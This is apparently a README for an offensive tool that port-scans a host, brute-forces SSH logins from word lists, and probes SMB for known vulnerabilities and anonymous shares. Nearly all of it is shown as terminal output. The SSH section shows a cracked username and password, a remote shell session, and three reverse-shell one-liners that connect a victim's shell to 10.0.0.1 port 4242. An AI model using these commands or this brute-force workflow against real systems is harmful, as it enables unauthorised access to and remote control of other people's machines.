# Scanner (Vulnerability Detection and Exploitation)

It currently work with three services SSH, SMB and FTP. It initially scans ports to detect which are open and the services running on them. Then, it asks for user input to determine which service to interact with. 

## SSH
```bash
┌─[babayaga@babayaga-virtualbox]─[~/Desktop/DRDOdump]
└──╼ $sudo python3 main.py -uL userlist -uP passlist  -u 192.168.1.3
usage: SCANNER [-h] [-u IP_ADDRESS] [-p PORT] [-uL USERNAME LIST] [-uP PASSWORD LIST]

This script scans ports to detect active services and subsequently exploits them.

optional arguments:
  -h, --help         show this help message and exit
  -u IP_ADDRESS      ip address
  -p PORT            port value
  -uL USERNAME LIST  path to file containing usernames
  -uP PASSWORD LIST  path to file containing passwords

> SCANNING STARTED

Progress : 100%|███████████████████████████████████████████████████████████████████████████████████████████████| 10/10 [00:02<00:00,  4.82it/s]

> SCANNING COMPLETED

> RESULTS:
   Port       Service
0    21           ftp
1    22           ssh
2    80          http
3   139   netbios-ssn
4   445  microsoft-ds

Enter the active services to be exploited: ssh
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4

[SUCCESS] ==> Username: babayaga ==> Password: babayaga12

A reverse shell can be obtained by starting a netcat listener on your device and uploading a reverse shell to victims device.
Example: 
    > bash -i >& /dev/tcp/10.0.0.1/4242 0>&1
    > 0<&196;exec 196<>/dev/tcp/10.0.0.1/4242; sh <&196 >&196 2>&196
    > /bin/bash -l > /dev/tcp/10.0.0.1/4242 0<&1 2>&1
            

A non persistent shell (-1 to exit): 

$ whoami
['babayaga\n']

$ id
['uid=1000(babayaga) gid=1001(babayaga) groups=1001(babayaga),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),109(netdev),120(bluetooth),132(lpadmin),138(scanner),1000(docker)\n']

$ -1

[SUCCESS]
```

## SMB
```bash
┌─[babayaga@babayaga-virtualbox]─[~/Desktop/DRDOdump]
└──╼ $sudo python3 main.py -uL userlist -uP passlist  -u 192.168.1.3
usage: SCANNER [-h] [-u IP_ADDRESS] [-p PORT] [-uL USERNAME LIST] [-uP PASSWORD LIST]

This script scans ports to detect active services and subsequently exploits them.

optional arguments:
  -h, --help         show this help message and exit
  -u IP_ADDRESS      ip address
  -p PORT            port value
  -uL USERNAME LIST  path to file containing usernames
  -uP PASSWORD LIST  path to file containing passwords

> SCANNING STARTED

Progress : 100%|███████████████████████████████████████████████████████████████████████████████████████████████| 10/10 [00:02<00:00,  4.84it/s]

> SCANNING COMPLETED

> RESULTS:
   Port       Service
0    21           ftp
1    22           ssh
2    80          http
3   139   netbios-ssn
4   445  microsoft-ds

Enter the active services to be exploited: microsoft-ds


Host script results:
|_smb-vuln-ms10-054: false
|_smb-vuln-ms10-061: Could not negotiate a connection:SMB: ERROR: Server returned less data than it was supposed to (one or more fields are missing); aborting [9]

> CHECKING FOR ANONYMOUS LOGIN AND ANY SHARES WE CAN ACCESS

Enter workgroup(default WORKGROUP): 

	Sharename       Type      Comment
	---------       ----      -------
	print$          Disk      Printer Drivers
	sambashare      Disk      Samba on Ubuntu
	IPC$            IPC       IPC Service (Samba 4.13.13-Debian)
SMB1 disabled -- no workgroup available
```
